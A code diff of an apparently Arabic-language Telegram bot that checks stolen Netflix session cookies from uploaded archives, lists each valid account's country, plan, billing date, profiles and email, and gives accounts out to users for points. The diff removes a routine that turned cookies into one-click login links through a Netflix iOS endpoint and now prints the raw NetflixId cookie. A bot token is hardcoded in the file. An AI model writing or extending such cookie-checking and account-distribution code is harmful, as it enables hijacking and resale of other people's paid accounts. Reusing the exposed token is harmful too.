@@ -20,8 +20,8 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # Owner credit & Channel info
-OWNER_CREDIT = "Faris - https://t.me/farxxes"
-CHANNEL_LINK = "https://t.me/faresschannel"
+OWNER_CREDIT = "Faris - https://t.me/farxxess"
+CHANNEL_LINK = "https://t.me/farxxess"
 
 # إعدادات بوت التليجرام
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8795234711:AAHQh9fufbVd63QoICaFK8rwdRzHD9V91SI')
@@ -33,7 +33,6 @@ DEVELOPER_ID = 8713916851
 STOCK_FILE = "stock_accounts.txt"
 USERS_FILE = "users_data.json"
 
-# قاموس لتتبع عمليات الفحص الجارية وإمكانية إيقافها
 active_scans = {}
 
 def load_users():
@@ -226,51 +225,6 @@ def check_netflix_cookie(cookie_dict):
     except Exception as e:
         return {'ok': False}
 
-def generate_token(netflix_id):
-    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
-    params = {
-        'appVersion': "15.48.1",
-        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
-        'device_type': "NFAPPL-02-",
-        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
-        'idiom': "phone",
-        'iosVersion': "15.8.5",
-        'isTablet': "false",
-        'languages': "en-US",
-        'locale': "en-US",
-        'maxDeviceWidth': "375",
-        'model': "saget",
-        'modelType': "IPHONE8-1",
-        'odpAware': "true",
-        'path': '["account","token","default"]',
-        'pathFormat': "graph",
-        'pixelDensity': "2.0",
-        'progressive': "false",
-        "responseFormat": "json"
-    }
-    headers = {
-        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
-        'Cookie': f"NetflixId={netflix_id}"
-    }
-    try:
-        response = requests.get(url, params=params, headers=headers, timeout=15, verify=False)
-        data = response.json()
-        if "value" in data and data["value"] and "account" in data["value"]:
-            token_data = data["value"]["account"]["token"]["default"]
-            token = token_data["token"]
-            return {
-                "status": "Success",
-                "token": token
-            }
-    except Exception as e:
-        logger.error(f"Error in generate_token: {e}")
-    
-    # 🌟 حل بديل ذكي: إذا فشل الـ API، نستخدم NetflixId مباشرة كرمز دخول للحساب
-    return {
-        "status": "Success",
-        "token": netflix_id
-    }
-
 def extract_zip_and_get_files(zip_path, extract_dir):
     txt_files = []
     try:
@@ -332,18 +286,13 @@ def callback_query(call):
             save_users(users)
             
             markup = InlineKeyboardMarkup()
-            token_match = re.search(r'nftoken=([^\s]+)', account)
-            if token_match:
-                t_val = token_match.group(1)
-                pc_url = f"https://www.netflix.com/login?nftoken={t_val}"
-                phone_url = f"https://www.netflix.com/browse?nftoken={t_val}"
-                markup.add(
-                    InlineKeyboardButton("💻 PC Login", url=pc_url),
-                    InlineKeyboardButton("📱 Phone Login", url=phone_url)
-                )
+            markup.add(
+                InlineKeyboardButton("💻 Netflix Login", url="https://www.netflix.com/login"),
+                InlineKeyboardButton("📱 Open Netflix", url="https://www.netflix.com")
+            )
             
             watermarked_acc = f"{account}\n\n👑 *Dev:* @farxxess | [Channel](https://t.me/farxxess)"
-            bot.send_message(call.message.chat.id, f"🌟 **PREMIUM ACCOUNT** 🌟\n\n{watermarked_acc}\n\n💰 رصيدك المتبقي: {users[str_id]['points']} نقطة", parse_mode='Markdown', reply_markup=markup if token_match else None)
+            bot.send_message(call.message.chat.id, f"🌟 **PREMIUM ACCOUNT** 🌟\n\n{watermarked_acc}\n\n💰 رصيدك المتبقي: {users[str_id]['points']} نقطة", parse_mode='Markdown', reply_markup=markup)
         else:
             bot.send_message(call.message.chat.id, "⚠️ عذراً، ذاكرة الحسابات فارغة حالياً. انتظر حتى يتم فحص ملفات جديدة!")
             
@@ -373,8 +322,6 @@ def callback_query(call):
         if scan_id in active_scans:
             active_scans[scan_id] = True
             bot.answer_callback_query(call.id, text="⏹️ تم طلب إيقاف الفحص بنجاح!", show_alert=True)
-        else:
-            bot.answer_callback_query(call.id, text="انتهى الفحص بالفعل أو تم إيقافه.", show_alert=True)
 
 @bot.message_handler(commands=['addpoints'])
 def add_points_command(message):
@@ -483,7 +430,6 @@ def handle_documents(message):
                 
                 if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
                     valid_count += 1
-                    token_result = generate_token(netflix_id)
                     
                     res_msg = "🎬 **حساب NETFLIX صالح وفعال** 🎬\n\n"
                     res_msg += f"🌍 البلد: `{account_info['country']}`\n"
@@ -492,18 +438,12 @@ def handle_documents(message):
                     res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
                     res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
                     res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
+                    res_msg += f"🔑 **NetflixId Cookie:**\n`{netflix_id}`\n"
                     
                     markup = InlineKeyboardMarkup()
-                    token_val = token_result.get('token', netflix_id)
-                    
-                    # روابط مباشرة صحيحة لكل حساب على حدة
-                    pc_url = f"https://www.netflix.com/login?nftoken={token_val}"
-                    phone_url = f"https://www.netflix.com/browse?nftoken={token_val}"
-                    
-                    res_msg += f"\n📱 رابط الدخول المباشر:\n`{phone_url}`\n"
                     markup.add(
-                        InlineKeyboardButton("💻 PC Login", url=pc_url),
-                        InlineKeyboardButton("📱 Phone Login", url=phone_url)
+                        InlineKeyboardButton("💻 Netflix Login", url="https://www.netflix.com/login"),
+                        InlineKeyboardButton("📱 Open Netflix", url="https://www.netflix.com")
                     )
                         
                     res_msg += f"\n👑 *Dev:* @farxxess | [Channel](https://t.me/farxxess)"
@@ -537,5 +477,5 @@ def handle_documents(message):
                 pass
 
 if __name__ == '__main__':
-    logger.info("Telegram Bot is running for Faris with individual account links...")
+    logger.info("Telegram Bot is running for Faris with direct cookie value output...")
     bot.infinity_polling()
